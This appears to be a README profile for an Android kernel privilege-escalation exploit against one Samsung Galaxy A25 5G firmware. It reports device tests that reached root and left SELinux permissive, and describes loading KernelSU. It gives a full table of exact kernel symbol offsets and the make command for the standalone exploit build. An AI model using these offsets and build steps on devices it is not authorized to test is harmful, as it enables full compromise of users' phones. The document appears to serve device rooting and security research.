# SM-A256E / A256EXXSADZA2

This profile supports the Samsung Galaxy A25 5G (`SM-A256E`). It requires the
exact `A256EXXSADZA2` firmware and its Samsung 5.10.237 kernel:

```text
5.10.237-android12-9-31999025-abA256EXXSADZA2
```

The device (IMEI/SN `R6CX9011EFH`, `a25xdtur`) was used for every on-device
step below.

## Validation status

- Standalone transient root: device-tested, repeated success.
- KernelSU late-load: device-tested, module loaded and `kcsu` control verified.
- App payload: not validated and disabled at compile time (same as the ZE6
  profile; the app-domain physical-P0 route needs the order-3 pipe kernel-read
  fd before slide discovery, which the socket-interleave profile cannot
  provide).

The successful standalone runs reached UID 0 in `u:r:kernel:s0`. The exploit
is probabilistic (one attempt per boot); a successful run leaves SELinux
permissive until reboot. Two full runs were captured on the same device over
separate boots.

## KernelSU

The module was built from KernelSU v3.2.5
(`b0bc817b4e966aa6aa830834eaf6ef765d821d40`) + the repository's Samsung
KDP/RKP/DEFEX patch, using the Samsung Exynos 1280 (`s5e8825`) kernel tree
with the exact `A256EXXSADZA2` release string and the device's
`CONFIG_CFI_CLANG`/`CONFIG_TRIM_UNUSED_KSYMS`/`no-module-force-load`
configuration:

```text
vermagic: 5.10.237-android12-9-31999025-abA256EXXSADZA2 SMP preempt mod_unload modversions aarch64
```

Because the stock THIN-LTO layout panics on this 5.10 kernel (same issue as
the SM-F9360 profile), the module was built with `CONFIG_LTO_NONE` and
`CONFIG_CFI_CLANG` disabled, producing a unified `.text` layout that loads
cleanly. The manual-relocation audit against the recovered
`A256EXXSADZA2.rec` vmlinux reports:

```text
undefined symbols: 202
module version entries (__versions): 0
missing from target symbol table: 0
target CRC mismatches: 0
```

`ksud late-load` returned `0` on-device; `verify_kernelsu_control` passed;
`/proc/modules` reports `kernelsu ... Live`; KernelSU re-enabled SELinux
enforcing after init (its stealth behavior).

## Symbol offsets

All offsets below were derived from the exact `A256EXXSADZA2` kernel Image
(recovered ELF base `0xffffffc008000000`), cross-checked against the device's
`/proc/zoneinfo` (`start_pfn=0x80000` → DRAM base `0x80000000`) and
`/sys/kernel/tracing/events/sched/sched_blocked_reason/id` (`104`).

| Macro | Value |
| --- | ---: |
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` |
| `P0_PHYS_OFFSET` / `P0_KERNEL_PHYS_LOAD` | `0x80000000` |
| `ASHMEM_MISC_FOPS_OFF` | `0x01ffbbe0` |
| `ASHMEM_FOPS_OFF` | `0x01b0a498` |
| `ASHMEM_IOCTL_OFF` | `0x00c3742c` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00c37d80` |
| `ASHMEM_MMAP_OFF` | `0x00c37dd8` |
| `ASHMEM_OPEN_OFF` | `0x00c38008` |
| `ASHMEM_RELEASE_OFF` | `0x00c3808c` |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00c381ac` |
| `CONFIGFS_READ_ITER_OFF` (`configfs_read_file`) | `0x00447488` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` (`configfs_write_bin_file`) | `0x004478e8` |
| `COPY_SPLICE_READ_OFF` | `0x003c3ad8` |
| `NOOP_LLSEEK_OFF` | `0x003789dc` |
| `INIT_TASK_OFF` | `0x01e0dd00` |
| `ROOT_TASK_GROUP_OFF` | `0x02092080` |
| `SELINUX_ENFORCING_OFF` | `0x021ddb68` |
| `KMALLOC_CACHES_OFF` | `0x01b4ff40` |
| `SKBUFF_HEAD_CACHE_OFF` | `0x01b58e18` |
| `MM_CACHEP_OFF` | `0x0207f180` |
| `ANON_PIPE_BUF_OPS_OFF` | `0x0197e868` |
| `PIPE_USER_PAGES_SOFT_OFF` | `0x01f6b770` |
| `PIPE_USER_PAGES_HARD_OFF` | `0x02149678` |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x01df9e10` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `0x000f6be4` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `0x000fe2f8` |
| `SLIDE_WORKER_THREAD_OFF` | `0x000fe238` |
| `SLIDE_TRACEFS_EVENT_ID` | `104` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x0188e4eb` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `0x01e01370` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `0x01fbc430` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x02282109` |

Structure geometry (`mm_struct` slab `0x3c0`, order 3, `kmalloc-1k` pipe
reclaim at index 10, SKB headroom `0xe80`) is identical to the ZE6 build and
was re-verified by disassembling this firmware's `mm_cache_init`,
`unix_stream_sendmsg` (`sub w8,w28,#0xe80`) and `__check_heap_object`
(useroffset `0xf4`, usersize `0xf8`).

## Build

```sh
make TARGET=a25x-A256EXXSADZA2 \
  ANDROID_NDK_HOME=/path/to/android-ndk-r29 standalone
```

Use only on a device you own or are explicitly authorized to test.